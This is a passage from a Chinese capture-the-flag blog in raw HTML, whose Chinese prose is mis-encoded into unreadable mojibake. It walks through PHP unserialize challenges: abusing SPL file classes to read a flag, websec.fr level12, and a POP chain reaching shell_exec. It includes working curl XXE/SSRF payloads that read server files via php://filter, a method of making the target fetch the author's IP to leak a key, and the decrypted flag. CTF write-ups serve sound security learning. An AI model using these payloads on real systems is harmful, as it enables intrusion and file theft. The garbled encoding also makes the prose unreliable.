class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params">$code</span>)</span>&#123;</span><br><span class="line">        $pattern = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match($pattern, $code))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€»è¾‘è¿˜æ˜¯æŒºå¥½æ‹çš„â€¦â€¦è¿™é‡Œå…³é”®æ˜¯å¯¹phpåŸç”Ÿæ–‡ä»¶æ“ä½œç±»çš„åº”ç”¨ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.spl.php">https://www.php.net/manual/zh/book.spl.php</a></p>
<blockquote>
<table>
<thead>
<tr>
<th>ç±»</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>DirectoryIterator</td>
<td>éå†ç›®å½•ã€‚</td>
</tr>
<tr>
<td>FilesystemIterator</td>
<td>éå†ç›®å½•ã€‚</td>
</tr>
<tr>
<td>GlobIterator</td>
<td>éå†ç›®å½•ï¼Œä½†æ˜¯ä¸åŒçš„ç‚¹åœ¨äºå®ƒå¯ä»¥é€šé…ä¾‹å¦‚/var/html/www/flag*ã€‚</td>
</tr>
<tr>
<td>SplFileObject</td>
<td>è¯»å–æ–‡ä»¶ï¼ŒæŒ‰è¡Œè¯»å–ï¼Œå¤šè¡Œéœ€è¦éå†ï¼›URL å¯ä½œä¸ºæ–‡ä»¶åï¼Œå—åˆ°<code>allow_url_fopen</code>å½±å“ã€‚</td>
</tr>
<tr>
<td>finfo/finfo_open()</td>
<td>éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œè¯»å–æ–‡ä»¶ã€‚</td>
</tr>
</tbody></table>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±å¯ä»¥æ§åˆ¶classä¸ºSPL(æ ‡å‡†PHPç±»åº“)ä¸­çš„æ–‡ä»¶æ“ä½œç±»ã€‚</p>
<p>ä½†æ˜¯â€¦â€¦DirectoryIteratorå’ŒFilesystemIterator ä½œä¸ºè¿­ä»£å™¨ï¼Œéœ€è¦å¾ªç¯éå†è¾“å‡ºæ¯ä¸€ä¸ªä¸åŒçš„ç›®å½•ä¸‹æ–‡ä»¶ï¼Œæ‰€ä»¥ç›´æ¥è¾“å‡ºåªæ˜¾ç¤ºç¬¬ä¸€ä¸ªæ–‡ä»¶</p>
<p>GlobIteratorå¯ä»¥ä½¿ç”¨é€šé…ç¬¦æœç´¢ï¼ŒåŒæ ·ï¼Œåªæ˜¾ç¤ºæœç´ åˆ°çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶â€¦â€¦</p>
<p>è¿™é“é¢˜å°±æ˜¯åˆ©ç”¨FilesystemIteratoræ‰¾flagæ–‡ä»¶ï¼ŒSplFileObjectè¯»å–flagæ–‡ä»¶</p>
<p>æ¥çœ‹ç±»ä¼¼çš„ä¸€é“é¢˜ï¼š</p>
<h3 id="websec-LevelTwelve"><a href="#websec-LevelTwelve" class="headerlink" title="websec-LevelTwelve"></a>websec-LevelTwelve</h3><p><a target="_blank" rel="noopener" href="http://websec.fr/level12/index.php">http://websec.fr/level12/index.php</a></p>
<p>finfoçš„åˆ©ç”¨ï¼š</p>
<blockquote>
<h2 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h2><p><strong>FINFO</strong> (<em>file-id</em>,<em>info-item</em>)</p>
<ul>
<li><strong>file-id</strong></li>
<li>specifies the identifier that was assigned when the file was opened (generally by the FOPEN function).</li>
<li><strong>info-item</strong></li>
<li>specifies the number of the information item that is to be retrieved.</li>
</ul>
<p>FINFOå‡½æ•°ä¸ºå…ˆå‰å·²æ‰“å¼€å¹¶ç”±FOPENå‡½æ•°åˆ†é…äº†<strong>æ–‡ä»¶ID</strong>çš„å¤–éƒ¨æ–‡ä»¶è¿”å›æŒ‡å®šä¿¡æ¯é¡¹çš„å€¼ã€‚</p>
<p>FINFOï¼ŒFOPTNAMEå’ŒFOPTNUMå‡½æ•°æ”¯æŒä»¥ä¸‹ä¿¡æ¯é¡¹ã€‚</p>
<p><strong>file-id</strong>ï¼š</p>
<p><strong>Information Items for Unix System Services Files</strong></p>
<p><strong><em>Unixç³»ç»ŸæœåŠ¡æ–‡ä»¶çš„ä¿¡æ¯é¡¹</em></strong></p>
<table>
<thead>
<tr>
<th><strong>Item</strong></th>
<th><strong>é¡¹ç›®æ ‡è¯†ç¬¦</strong></th>
<th><strong>Definition</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>File Nameæ–‡ä»¶å</td>
<td>File name</td>
</tr>
<tr>
<td>2</td>
<td>Access Permissionå­˜å–æƒé™</td>
<td>Read, write, and execute permissions for owner, group, and other</td>
</tr>
<tr>
<td>3</td>
<td>Number of Linksé“¾æ¥æ•°</td>
<td>Number of links in the file</td>
</tr>
<tr>
<td>4</td>
<td>Owner Nameæ‰€æœ‰è€…åç§°</td>
<td>User ID of the owner</td>
</tr>
<tr>
<td>5</td>
<td>Group Nameå›¢é˜Ÿå</td>
<td>Name of the ownerâ€™s access group</td>
</tr>
<tr>
<td>6</td>
<td>File Sizeæ–‡ä»¶å¤§å°</td>
<td>File size</td>
</tr>
<tr>
<td>7</td>
<td>Last Modifiedæœ€åä¿®æ”¹</td>
<td>Date file last modified</td>
</tr>
</tbody></table>
<p><strong><em>Information Items for Sequential Files and members of PDSs and PDSEs</em></strong></p>
<p><strong><em>é¡ºåºæ–‡ä»¶ä»¥åŠPDSå’ŒPDSEæˆå‘˜çš„ä¿¡æ¯é¡¹</em></strong></p>
<table>
<thead>
<tr>
<th><strong>Item</strong></th>
<th><strong>Item Identifier</strong></th>
<th><strong>Definition</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Dsnameåç§°</td>
<td>File name</td>
</tr>
<tr>
<td>2</td>
<td>Unitå•å…ƒ</td>
<td>Disk type</td>
</tr>
<tr>
<td>3</td>
<td>Volumeä½“ç§¯</td>
<td>Volume on which data setresides</td>
</tr>
<tr>
<td>4</td>
<td>Dispæ˜¾ç¤º</td>
<td>Disposition</td>
</tr>
<tr>
<td>5</td>
<td>Blksize</td>
<td>Block size</td>
</tr>
<tr>
<td>6</td>
<td>Lrecl</td>
<td>Record length</td>
</tr>
<tr>
<td>7</td>
<td>Recfm</td>
<td>Record format</td>
</tr>
</tbody></table>
<p><strong>info-item</strong>ï¼šæ‰€æ‰“å¼€çš„æ–‡ä»¶</p>
</blockquote>
<p>å¥½ä¸å®¹æ˜“æŸ¥åˆ°çš„èµ„æ–™ï¼Œä¼¼ä¹ä¹Ÿæ²¡ä»€ä¹ˆç”¨â€¦â€¦</p>
<p><img src="/images/DASCTF%E4%B8%89%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20210330162313649.png" alt="image-20210330162313649"></p>
<p>æ§åˆ¶ç±»åè¯»å–index.php</p>
<p><img src="/images/DASCTF%E4%B8%89%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20210330162402047.png" alt="image-20210330162402047"></p>
<p>è¿™é‡Œå¤§é‡çš„æŠ¥é”™ï¼Œå¸¦å‡ºäº†è®¸å¤šæ–‡ä»¶å†…å®¹ï¼Œ</p>
<p>å…·ä½“åŸå› ï¼š<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/167140#h2-7">https://www.anquanke.com/post/id/167140#h2-7</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Congratulation, you can read this file, but this is not the end of our journey.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- Thanks to cutz for the QA.</span></span><br><span class="line"><span class="comment">- Thanks to blotus for finding a (now fixed) weakness in the &quot;encryption&quot; function.</span></span><br><span class="line"><span class="comment">- Thanks to nurfed for nagging us about a cheat</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$text = <span class="string">&#x27;Niw0OgIsEykABg8qESRRCg4XNkEHNg0XCls4BwZaAVBbLU4EC2VFBTooPi0qLFUELQ==&#x27;</span>;</span><br><span class="line">$key = ini_get (<span class="string">&#x27;user_agent&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] !== $key) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;Cheating is bad, m&#x27;kay?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    $flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (str_split (base64_decode ($text)) <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">        $flag .= chr (ord ($key[$i++]) ^ ord ($letter));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span> ($flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å°±æ˜¯è·å–keyäº†</p>
<p>å€ŸåŠ©SplFileObjectçš„ç‰¹æ€§ï¼Œè®¿é—®æˆ‘ä»¬çš„IPï¼Œç›‘å¬è·å–use_agentï¼Œä¹Ÿå°±æ˜¯key</p>
<p><img src="/images/DASCTF%E4%B8%89%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20210330164631817.png" alt="image-20210330164631817"></p>
<p>åŠ ä¸€ä¸ª<code>\</code>å°±å¯ä»¥ç»•è¿‡â€¦â€¦ï¼š</p>
<blockquote>
<p>Without any namespace definition, all class and function definitions are placed into the global space - as it was in PHP before namespaces were supported. Prefixing a name with \ will specify that the name is required from the global space even in the context of the namespace.</p>
<p>ç™¾åº¦æœºç¿»ï¼š</p>
<p>æ²¡æœ‰ä»»ä½•åç§°ç©ºé—´å®šä¹‰ï¼Œæ‰€æœ‰çš„ç±»å’Œå‡½æ•°å®šä¹‰éƒ½æ”¾åœ¨å…¨å±€ç©ºé—´ä¸­â€”â€”å°±åƒåœ¨æ”¯æŒåç§°ç©ºé—´ä¹‹å‰çš„PHPä¸­ä¸€æ ·ã€‚åœ¨åç§°å‰é¢åŠ ä¸Š\å°†æŒ‡å®šè¯¥åç§°å¿…é¡»æ¥è‡ªå…¨å±€ç©ºé—´ï¼Œå³ä½¿åœ¨å‘½åç©ºé—´çš„ä¸Šä¸‹æ–‡ä¸­ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p>
</blockquote>
<img src="/images/DASCTFä¸‰æœˆå¤ç°/image-20210330164826855.png" alt="image-20210330164826855" style="zoom:200%;" />

<p>è·å¾—keyï¼šaiviGohdahvueL0dedi5hievi0Ahsh1aor9aiQu5eemaisi7Phai9PhohpheiweiP7eifooVooviesh9meighoolahm3Phe0Ii6gieL1Pidoodiephein3iK8tae3aec</p>
<p>è§£å¯†è„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = <span class="string">&quot;aiviGohdahvueL0dedi5hievi0Ahsh1aor9aiQu5eemaisi7Phai9PhohpheiweiP7eifooVooviesh9meighoolahm3Phe0Ii6gieL1Pidoodiephein3iK8tae3aec&quot;</span>;</span><br><span class="line">$text = <span class="string">&quot;Niw0OgIsEykABg8qESRRCg4XNkEHNg0XCls4BwZaAVBbLU4EC2VFBTooPi0qLFUELQ==&quot;</span>;</span><br><span class="line">$flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (str_split (base64_decode ($text)) <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">    $flag .= chr (ord ($key[$i++]) ^ ord ($letter));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="comment">//WEBSEC&#123;Many_thanks_to_hackyou2014_web400_MSLC_&lt;3&#125;</span></span><br></pre></td></tr></table></figure>

<p>å¤§ä½¬çš„ssrfï¼ˆè¿™æ˜¯åˆ©ç”¨äº†xmlå—â€¦â€¦tqlï¼‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å¾—åˆ°æºç :</span><br><span class="line">curl -s --data &#39;submit&#x3D;&amp;class&#x3D;SimpleXMLElement&amp;param2&#x3D;2&amp;param1&#x3D;&lt;!DOCTYPE xxe [&lt;!ENTITY foo SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;index.php&quot;&gt;]&gt;&lt;root&gt;%26foo;&lt;&#x2F;root&gt;&#39; http:&#x2F;&#x2F;websec.fr&#x2F;level12&#x2F;index.php | grep -oE -m1 &#39;&lt;pre&gt;(.*)&lt;&#x2F;pre&gt;&#39; </span><br><span class="line">å¯ä»¥ç»§ç»­è·å–php.iniï¼Œè·¯å¾„æœªçŸ¥ï¼Œ </span><br><span class="line">ä¹Ÿå¯ä»¥: é€šè¿‡ssrfè·å–flag: </span><br><span class="line">curl -s --data &#39;submit&#x3D;&amp;class&#x3D;SimpleXMLElement&amp;param2&#x3D;2&amp;param1&#x3D;&lt;!DOCTYPE xxe [&lt;!ENTITY foo SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;level12&#x2F;index.php&quot;&gt;]&gt;&lt;root&gt;%26foo;&lt;&#x2F;root&gt;&#39; http:&#x2F;&#x2F;websec.fr&#x2F;level12&#x2F;index.php | grep -oE -m1 &#39;WEBSEC&#123;.*&#125;&#39;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/26/ppppp%E5%A5%BD%E8%80%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/26/ppppp%E5%A5%BD%E8%80%B6/" class="post-title-link" itemprop="url">pppppå¥½è€¶</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-26 22:23:00" itemprop="dateCreated datePublished" datetime="2021-03-26T22:23:00+08:00">2021-03-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2021-03-30 16:40:09" itemprop="dateModified" datetime="2021-03-30T16:40:09+08:00">2021-03-30</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="é¢˜ç›®ï¼š"><a href="#é¢˜ç›®ï¼š" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $A1;</span><br><span class="line">    <span class="keyword">public</span> $A2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$param</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">            &#123;</span><br><span class="line">                $A3 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                $A3();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$wuhu</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;A2[$wuhu];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $B1;</span><br><span class="line">    <span class="keyword">public</span> $B2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;B1-&gt;godmi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $C1;</span><br><span class="line">    <span class="keyword">public</span> $C2;</span><br><span class="line">    <span class="keyword">public</span> $C3;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;C2 = <span class="keyword">$this</span>-&gt;C3.<span class="keyword">$this</span>-&gt;C1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $D1;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">FLAG</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;DDDD&#x27;</span>;</span><br><span class="line">        shell_exec(<span class="keyword">$this</span>-&gt;D1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $E1;</span><br><span class="line">    <span class="keyword">public</span> $E2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;E1-&gt;&#123;<span class="keyword">$this</span>-&gt;E2&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ppppp = $_POST[<span class="string">&#x27;Troy3e&#x27;</span>];</span><br><span class="line">unserialize($ppppp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="ååºåˆ—åŒ–æ­¥éª¤"><a href="#ååºåˆ—åŒ–æ­¥éª¤" class="headerlink" title="ååºåˆ—åŒ–æ­¥éª¤"></a>ååºåˆ—åŒ–æ­¥éª¤</h4><p>å¾ˆå¤šé­”æœ¯æ–¹æ³•ï¼Œéœ€è¦æ ¹æ®é€»è¾‘æ„é€ popé“¾ï¼š</p>
<p>è¿™é‡Œå”¯ä¸€å¯ä»¥è‡ªåŠ¨è°ƒç”¨çš„æ˜¯Bçš„destructï¼Œåœ¨phpè„šæœ¬ç»“æŸæ—¶è‡ªåŠ¨è°ƒç”¨</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;B1-&gt;godmi();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼šç±³ç¥å‡½æ•°ï¼Œå¯¹åº”çš„æ˜¯<strong>__callæ–¹æ³•</strong>ï¼Œ$nameå’Œ$paramå¯¹åº”çš„æ˜¯è°ƒç”¨ä¸­<strong>ä¸å­˜åœ¨çš„å‡½æ•°å</strong>å’Œ<strong>å‚æ•°</strong>ã€‚B(destruct)-&gt;A(call)</p>
<p>callä¸­æœ‰ä¸€ä¸ªifåˆ¤æ–­ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">            &#123;</span><br><span class="line">                $A3 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                $A3();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨äº†Aä¸­çš„{$name}å±æ€§ï¼Œ{}è§£é‡Šå™¨ä¼šè§£é‡Šä¸ºgodmiï¼Œå°±æ˜¯è°ƒç”¨äº†Aä¸­çš„godmiå±æ€§ï¼Œè€Œæ­¤å±æ€§ä¸å­˜åœ¨ï¼Œå¯¹åº”çš„æ˜¯</p>
<p><strong>__getæ–¹æ³•</strong>ã€‚B(destruct)-&gt;A(call)-&gt;A(get)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$wuhu</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;A2[$wuhu];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>$wuhuè¿™é‡Œè·å–çš„æ˜¯<strong>ä¸å­˜åœ¨çš„å±æ€§å</strong>ï¼Œè¿”å›çš„æ˜¯A2[godmi]ã€‚è¿™é‡Œè¦æ§åˆ¶çš„A2[godmi]å…³è”åˆ°ï¼š</p>
